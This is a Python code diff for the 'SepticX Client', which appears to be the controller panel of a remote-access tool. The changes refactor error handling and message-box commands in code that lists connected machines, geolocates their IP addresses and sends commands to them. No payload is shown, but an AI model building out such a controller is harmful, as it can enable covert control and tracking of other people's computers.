@@ -225,7 +225,7 @@ class Controller(customtkinter.CTkFrame):
 
     def send_message_box(self, frame, title, message, target):
         messagebox = self.messagebox
-        self.master.send_command(f"messageBox|{messagebox}|{title}|{message}", target)
+        self.master.send_command(f"messageBox|{title}|{message}|{messagebox}", target)
 
         tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")
 
@@ -249,7 +249,7 @@ class Controller(customtkinter.CTkFrame):
 
         self.messagebox = "Error"
 
-        messageboxes = [
+        self.messageboxes = [
             "Error",
             "Question",
             "Warning"
@@ -258,7 +258,7 @@ class Controller(customtkinter.CTkFrame):
         label = customtkinter.CTkLabel(cover_frame, text="Select a message box type")
         label.grid(row=2, columnspan=3, pady=20)
         
-        for count, messagebox in enumerate(messageboxes):
+        for count, messagebox in enumerate(self.messageboxes):
             pil_image = Image.open(f"assets\\{messagebox}.png")
             image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image)
 
@@ -1016,9 +1016,11 @@ class App(customtkinter.CTk):
             }))
             
             if recv:
-                self.ws.settimeout(10)  # Set a timeout of 10 seconds
-                return self.ws.recv()
-        except websocket.WebSocketTimeoutException:
+                res = self.ws.recv()
+                print(res)
+                return res
+        except websocket.WebSocketTimeoutException as e:
+            print(e)
             tkinter.messagebox.showerror("SepticX Client", "Request timed out.")
             return None
 
@@ -1108,8 +1110,6 @@ class App(customtkinter.CTk):
                 except (websocket.WebSocketException, PermissionError, ConnectionError):
                     pass
 
-                print(e)
-
                 try:
                     ws = create_connection(f"wss://{self.server_address}/api/ws/computers")
                     ws.send(self.server_key)
@@ -1125,114 +1125,141 @@ class App(customtkinter.CTk):
             self.after(1000, self.update_profiles, main_frame, computers)
             return
 
-        computers = list(self.computers)
-        print(computers)
-        table_values = []
+        try:
+            computers = list(self.computers)
+            print(computers)
+            table_values = []
 
-        profiles = json.load(open("computers.json", "r+"))
-        new_profiles = profiles + computers
+            profiles = json.load(open("computers.json", "r+"))
+            new_profiles = profiles + computers
 
-        offline_computers = [] # Load stored computers and assume they're offline
-        for idx, computer in enumerate(profiles):
-            if computer in computers: # If a computer is in the online list it can't be offline
-                continue
-
-            vals = computer.split('|')
-
-            username = vals[0]
-            ip_address = vals[1]
-
-            if len(vals) > 2:
-                version = vals[2]
-
-            else:
-                version = "Beta"
-
-            tries = 5
-            while tries != 0:
-                ipinfo = requests.get(f"http://ip-api.com/json/{ip_address}").json()
-                
-                if 'country' not in ipinfo:
-                    print(ipinfo)
-                    time.sleep(1)
-                    tries -= 1
+            offline_computers = [] # Load stored computers and assume they're offline
+            for idx, computer in enumerate(profiles):
+                if computer in computers: # If a computer is in the online list it can't be offline
                     continue
 
-                country = ipinfo['country']
-                break
+                vals = computer.split('|')
 
-            else:
-                country = "Rate Limited"
+                username = vals[0]
+                ip_address = vals[1]
 
-            offline_computers.append([country, username, ip_address, "Offline", version, "More Options"])
+                if len(vals) > 2:
+                    version = vals[2]
+
+                else:
+                    version = "Beta"
+
+                tries = 5
+                while tries != 0:
+                    
+                    try:
+                        request = requests.get(f"http://ip-api.com/json/{ip_address}")
+                        ipinfo = request.json()
+                        
+                        if 'country' not in ipinfo:
+                            time.sleep(1)
+                            tries -= 1
+                            continue
+
+                        country = ipinfo['country']
+                        break
+                    except:
+                        tries -= 1
+                        time.sleep(1)
+
+                else:
+                    country = "Rate Limited"
+
+                offline_computers.append([country, username, ip_address, "Offline", version, "More Options"])
 
 
-        online_computers = [] # Load connected computers and assume they're online
-        for idx, computer in enumerate(computers):
-            
-            vals = computer.split('|')
-
-            username = vals[0]
-            ip_address = vals[1]
-
-            if len(vals) > 2:
-                version = vals[2]
-
-            else:
-                version = "Beta"
-
-            idle_time = self.send_command("status", computer)
-            print(f"Idle time of {computer}: {idle_time}")
-            if not idle_time or idle_time < 60: # If idle time is less than a minute, assume online
-                status = "Online"
-
-            else:
-                units = [
-                    "seconds",
-                    "minutes",
-                    "hours"
-                ]
-
-                idle_time = int(idle_time)
-                idx = min(math.floor(math.log(idle_time, 60)), 2)
-                unit = units[idx]
-                converted_time = round(idle_time / 60 ** idx, 2)
-
-                status = f"Idle: {converted_time} {units}"
-
-            tries = 5
-            while tries != 0:
-                ipinfo = requests.get(f"http://ip-api.com/json/{ip_address}").json()
+            online_computers = [] # Load connected computers and assume they're online
+            for idx, computer in enumerate(computers):
                 
-                if 'country' not in ipinfo:
-                    print(ipinfo)
-                    time.sleep(1)
-                    tries -= 1
-                    continue
+                vals = computer.split('|')
 
-                country = ipinfo['country']
-                break
+                username = vals[0]
+                ip_address = vals[1]
 
-            else:
-                country = "Rate Limited"
+                if len(vals) > 2:
+                    version = vals[2]
 
-            if computer not in profiles:
-                threading.Thread(target=self.toast.show_toast, args=("SepticX", f"New client connected! {computer}")).start()
+                else:
+                    version = "Beta"
 
-            online_computers.append([country, username, ip_address, "Online", version, "More Options"])
+                # tries = 3
+                # while tries != 0:
+                #     idle_time = self.send_command("status", computer, recv=True)
+                #     print(f"Idle time of {computer}: {idle_time}")
 
-        table_values = [self.header] + online_computers + offline_computers # Put rows together
+                #     try:
+                #         int(idle_time)
+                #     except ValueError:
+                #         print(f"Invalid idle time: {idle_time}")
+                #         idle_time = 0
 
-        print(table_values)
+                #     tries -= 1
 
-        with open("computers.json", "w+") as file:
-            file.write(json.dumps(
-                    list(set(new_profiles)),
-                    indent = 6
-                ))
+                # if not idle_time or idle_time < 60: # If idle time is less than a minute, assume online
+                #     status = "Online"
 
-        self.table.configure(values=table_values)
-        self.after(0, self.update_profiles, main_frame, computers)
+                # else:
+                #     units = [
+                #         "seconds",
+                #         "minutes",
+                #         "hours"
+                #     ]
+
+                #     idle_time = int(idle_time)
+                #     idx = min(math.floor(math.log(idle_time, 60)), 2)
+                #     unit = units[idx]
+                #     converted_time = round(idle_time / 60 ** idx, 2)
+
+                #     status = f"Idle: {converted_time} {units}"
+
+                tries = 5
+                while tries != 0:
+                    
+                    try:
+                        request = requests.get(f"http://ip-api.com/json/{ip_address}")
+                        ipinfo = request.json()
+                        
+                        if 'country' not in ipinfo:
+                            time.sleep(1)
+                            tries -= 1
+                            continue
+
+                        country = ipinfo['country']
+                        break
+                    except Exception as e:
+                        tries -= 1
+                        print(e)
+                        time.sleep(1)
+
+                else:
+                    country = "Rate Limited"
+
+                if computer not in profiles:
+                    threading.Thread(target=self.toast.show_toast, args=("SepticX", f"New client connected! {computer}")).start()
+
+                online_computers.append([country, username, ip_address, "Online", version, "More Options"])
+
+            table_values = [self.header] + online_computers + offline_computers # Put rows together
+
+            print(table_values)
+
+            with open("computers.json", "w+") as file:
+                file.write(json.dumps(
+                        list(set(new_profiles)),
+                        indent = 6
+                    ))
+
+            self.table.configure(values=table_values)
+        except Exception as e:
+            print("ERROR", e)
+
+        finally:
+            self.after(0, self.update_profiles, main_frame, computers)
 
     def click(self, box):
         column = box.get('column')
